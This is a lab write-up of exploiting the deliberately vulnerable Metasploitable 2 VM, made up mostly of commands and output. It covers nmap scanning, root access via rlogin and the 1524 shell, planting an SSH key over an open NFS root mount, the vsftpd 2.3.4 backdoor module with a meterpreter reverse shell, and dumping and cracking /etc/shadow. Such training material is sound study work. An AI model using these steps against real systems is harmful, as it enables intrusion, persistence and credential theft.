---
title: Working through Metasploitable 2
date: 2018-03-xx
---

## Introduction

Metasploitable 2 is an intentionally vulnerable Linux distribution, provided by the folks at Offensive Security, as a training tool for those looking to learn and develop there skills with the Metasploit framework.

-- #TODO: add a link to download. https://information.rapid7.com/metasploitable-download.html

This is an older environment, based on Ubuntu 8.04. It comes with a default username and password of `msfadmin` / `msfadmin` which can be used for anything really, but which I only used to log in and query the network address of the system (`172.16.243.143`), which was running as a VMWare VM with a host only network connection. This allowed me to then start probing the system from a fresh Kali Linux 2018.1 VM I had installed alongside of the Metasploitable host.

In this particular case, I chose to save time by just logging in to the target VM and enumerating it's IP address, since it should be one of only three hosts on my small host-only network created by VMWare (the others being the host itself, as well as the attacking Kali Linux VM).

Once I had the IP address, I took the step of adding that to my Kali `/etc/hosts` file, so that I could reference it by the name `target` rather than having to type out the IP address for every command.

    echo "172.16.243.143 target" >> /etc/hosts

## Scanning

A simple nmap scan resulted in the following results:

```
root@kali:~# nmap -n -Pn target

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-25 17:06 EDT
Nmap scan report for target (172.16.243.143)
Host is up (0.0018s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:45:7D:7F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

A hint from other sources led me to add the `-p-` flag, which searches across all ports, rather than just the top 1000 as done by default. This resulted in a few extra high number ports >= 8787:

```
root@kali:~# nmap -n -Pn -p- target

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-25 17:07 EDT
Nmap scan report for target (172.16.243.143)
Host is up (0.0019s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  ircs-u
8009/tcp  open  ajp13
8180/tcp  open  unknown
8787/tcp  open  msgsrvr
36889/tcp open  unknown
45776/tcp open  unknown
49007/tcp open  unknown
51042/tcp open  unknown
MAC Address: 00:0C:29:45:7D:7F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
```

An even more detailed scan, adding the `-A` flag to perform OS and service fingerprinting, yielded even greater detail:

```
root@kali:~# nmap -n -Pn -p- -A target

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-25 17:08 EDT
Nmap scan report for target (172.16.243.143)
Host is up (0.00049s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 172.16.243.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2018-03-21T18:46:44+00:00; -4d02h24m03s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33371/udp  mountd
|   100005  1,2,3      45776/tcp  mountd
|   100021  1,3,4      42007/udp  nlockmgr
|   100021  1,3,4      51042/tcp  nlockmgr
|   100024  1          36889/tcp  status
|_  100024  1          52611/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    Java RMI Registry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, SupportsCompression, ConnectWithDatabase, LongColumnFlag, Speaks41ProtocolNew, SwitchToSSLAfterHandshake
|   Status: Autocommit
|_  Salt: QA3w$GyLQ3GL(!m%knh?
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2018-03-21T18:46:44+00:00; -4d02h24m03s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36889/tcp open  status      1 (RPC #100024)
45776/tcp open  mountd      1-3 (RPC #100005)
49007/tcp open  java-rmi    Java RMI Registry
51042/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 00:0C:29:45:7D:7F (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -4d02h24m03s, deviation: 0s, median: -4d02h24m03s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-03-21T14:46:41-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 172.16.243.143

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.93 seconds
```

## Exploitation

### rlogin

The first service that I poked at was the rlogin service, allowing remote login to the system via port 513. This required installing the rsh client:

```
root@kali:~# apt install rsh-client

```

... but once installed, it was trivial to log in to the system:

```
root@kali:~# rlogin target
Last login: Wed Mar 21 14:44:41 EDT 2018 from 172.16.243.144 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:~# hostname
metasploitable
```

### NFS

Another service that was seen running, was the NFS service on port 2049.

After installing the `nfs-common` package:

```
root@kali:~# apt install nfs-common
```

I was able to exam the NFS exports of the target by utilizing the `showmount` command:

```
root@kali:~# showmount -e target
Export list for target:
/ *
```

This is particularly dangerous, as it allows any system to mount the root filesystem of the target system. Doing so, it was possible to make any arbitrary changes and exfilitration from the target system:

```
root@kali:~# mount -t nfs target:/ /mnt
root@kali:~# ls -l /mnt
total 96
drwxr-xr-x  2 root root  4096 May 13  2012 bin
drwxr-xr-x  3 root root  4096 Apr 28  2010 boot
lrwxrwxrwx  1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  2 root root  4096 Apr 28  2010 dev
drwxr-xr-x 94 root root  4096 Mar 21 14:57 etc
drwxr-xr-x  6 root root  4096 Apr 16  2010 home
drwxr-xr-x  2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx  1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x 13 root root  4096 May 13  2012 lib
drwx------  2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x  4 root root  4096 Mar 16  2010 media
drwxr-xr-x  3 root root  4096 Apr 28  2010 mnt
-rw-------  1 root root  5821 Mar 21 14:15 nohup.out
drwxr-xr-x  2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x  2 root root  4096 Apr 28  2010 proc
drwxr-xr-x 13 root root  4096 Mar 21 14:15 root
drwxr-xr-x  2 root root  4096 May 13  2012 sbin
drwxr-xr-x  2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  2 root root  4096 Apr 28  2010 sys
drwxrwxrwt  4 root root  4096 Mar 21 14:46 tmp
drwxr-xr-x 12 root root  4096 Apr 28  2010 usr
drwxr-xr-x 14 root root  4096 Mar 17  2010 var
lrwxrwxrwx  1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
```

One way, suggested by the Metasploitable guide, which I had read a bit up to this point, suggested to add an SSH key to the `/root/.ssh/authorized_keys` file on the target, thus allowing direct SSH access into the system.

Step 1: Create a new SSH key on my attacking host

```
root@kali:~# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:oEBiBWG7u5H+iq5iHqF+LZxA0YgU8p7j5L//2DoiP3w root@kali
The key's randomart image is:
+---[RSA 2048]----+
|=BO.             |
|=*..             |
| .+   .          |
| o.o . .         |
|.o= .   S        |
|.=+.             |
|.==.o            |
|=.=*+.Eo         |
|OB++=*++o        |
+----[SHA256]-----+
```

Step 2: Install the key onto the target over the NFS root mount

```
root@kali:~# ll /mnt/root/.ssh/authorized_keys
-rw-r--r-- 1 root root 405 May 17  2010 /mnt/root/.ssh/authorized_keys
root@kali:~#
root@kali:~# cat /mnt/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
root@kali:~#
root@kali:~# cat ~/.ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys
root@kali:~#
root@kali:~# cat /mnt/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0kBlVF5lXk0vwB7cnOwsIZQOHzoAjkBh+sVZ0IeiUuW9afsSnEA56PGPh5rULNMhEI9fpCzu6nYpu1gA7i/F6in4Pd3UilRPH17cmqHCwfASSN03BTPypdRSSwyHamaTGarop2ZTeeuO+DxSx86FVwTo1LKsfal5rHI86y81zFrWb5Z3TDKPvEog47/3kMdEyYerXxYu/YT3JbaP6BQQo9+OfDa/PI4Qd5Q8aY0cIMUW/RGVnT5ERbGcNk/5TpZRoYVmnvvLyIG+xdGL82xG0brpcmYBi8Njla39mqOjWodjRg/CNbGk5QZI2CG5CdnuI3VbdSwTZovW79xTTKaHf root@kali
```

Step 3: SSH in to the target system

```
root@kali:~# ssh target
The authenticity of host 'target (172.16.243.143)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'target,172.16.243.143' (RSA) to the list of known hosts.
Last login: Wed Mar 21 14:49:58 2018 from 172.16.243.144
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:~# hostname
metasploitable
```

### Metasploitable Root shell

While perusing the open ports on the target VM, one in particular jumped out:

```
1524/tcp  open  shell       Metasploitable root shell
```

This was a curiousity... My first attempt was to attempt using rlogin to connect to the port, which did not appear to work correctly, though did seem to work enough to return part of a prompt to the user:

```
root@kali:~# rlogin -p 1524 target
oot@metasploitable:/#

ls
^C
root@kali:~# rlogin -p 1524 target
oot@metasploitable:/# id
;
^C
```

My next approach was to attempt a simple netcat connection to the host, which ended up being successful:

```
root@kali:~# nc -v target 1524
target [172.16.243.143] 1524 (ingreslock) open
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:/# hostname
metasploitable
```

### FTP

Another port that stood out was the FTP port 21, which was shown with the `nmap ... -A` command to allow anonymous logins:

```
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 172.16.243.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```

After installing the ftp client into my Kali Linux attack box:

```
root@kali:~# apt install ftp
```

This allowed authentication with any username and password combination, in my case, I chose `anonymous` / `anonymous`:

```
root@kali:~# ftp target
Connected to target.
220 (vsFTPd 2.3.4)
Name (target:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Poking around however, it appears that there aren't any files available for pilfering:

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
257 "/"
ftp>
```

Additionally, it appeared that there wasn't any opportunity to upload files, such as a `test` file that had been created:

```
ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
553 Could not create file.
```

That called for a different approach, which led me to search in the `searchsploit` exploit-db databse for the service `vsftpd`:

```
root@kali:~# searchsploit vsftpd
---------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------
vsftpd 2.0.5 - 'CWD' Authenticated Remote Memory Consumption                      | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                    | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                    | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                  | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | exploits/unix/remote/17491.rb
---------------------------------------------------------------------------------- ----------------------------------
```

Jackpot! It appears that there is an exploit available for the particular version, 2.3.4, which is installed on this server. I decided at this point to migrate to using metasploit (this is "metasploit"able after all...) and use it to

```
root@kali:~# msfconsole
...
msf > search vsftpd
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution


msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 172.16.243.143
RHOST => 172.16.243.143
msf exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 172.16.243.143:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.243.143:21 - USER: 331 Please specify the password.
[+] 172.16.243.143:21 - Backdoor service has been spawned, handling...
[+] 172.16.243.143:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.16.243.144:33661 -> 172.16.243.143:6200) at 2018-03-25 17:55:42 -0400

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

At this point, I decided to attempt upgrading my session in Metasploit to a meterpreter session, successfully accomplishing this via:

```
^Z
Background session 2? [y/N]  y

msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 2
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 172.16.243.144:4433
[*] Sending stage (857352 bytes) to 172.16.243.143
[*] Meterpreter session 3 opened (172.16.243.144:4433 -> 172.16.243.143:49559) at 2018-03-25 17:59:32 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
```

This allowed me to connect to the system via meterpreter, and download the `/etc/passwd` and `/etc/shadow` files:

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> passwd
[*] Downloaded 1.54 KiB of 1.54 KiB (100.0%): /etc/passwd -> passwd
[*] download   : /etc/passwd -> passwd
meterpreter > download /etc/shadow
[*] Downloading: /etc/shadow -> shadow
[*] Downloaded 1.18 KiB of 1.18 KiB (100.0%): /etc/shadow -> shadow
[*] download   : /etc/shadow -> shadow
```

Which I was then able to combine using the `unshadow` command, and crack using John the Ripper:

```
root@kali:~# unshadow passwd shadow > target_unshadowed.txt

root@kali:~# john target_unshadowed.txt
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
msfadmin         (msfadmin)
service          (service)
123456789        (klog)
batman           (sys)
6g 0:00:01:22  3/3 0.07256g/s 40533p/s 40534c/s 40534C/s juadlyf..juadlin
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

root@kali:~# john --show
Password files required, but none specified

root@kali:~# john --show target_unshadowed.txt
sys:batman:3:3:sys:/dev:/bin/sh
klog:123456789:103:104::/home/klog:/bin/false
msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
service:service:1002:1002:,,,:/home/service:/bin/bash

6 password hashes cracked, 1 left
```

This provided several basic passwords that could then be used to break into the system, e.g. via the standard SSH service.

| Username | Password |
| --- | --- |
| sys | batman |
| klog | 123456789 |
| msfadmin | msfadmin |
| postgres | postgres |
| user | user |
| service | service |

### telnet

Next, now that I had gotten a few passwords for the system, I turned to the telnet service to attempt to login directly to the system (e.g. using credentials `msfadmin` / `msfadmin` as shown on the Message of the Day banner), testing and confirming, that `msfadmin` had root access to the system:

```
root@kali:~# telnet target
Trying 172.16.243.143...
Connected to target.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: msfadmin
Password:
Last login: Wed Mar 21 14:31:57 EDT 2018 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
msfadmin@metasploitable:~$ hostname
metasploitable
msfadmin@metasploitable:~$ sudo su -
[sudo] password for msfadmin:
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
```
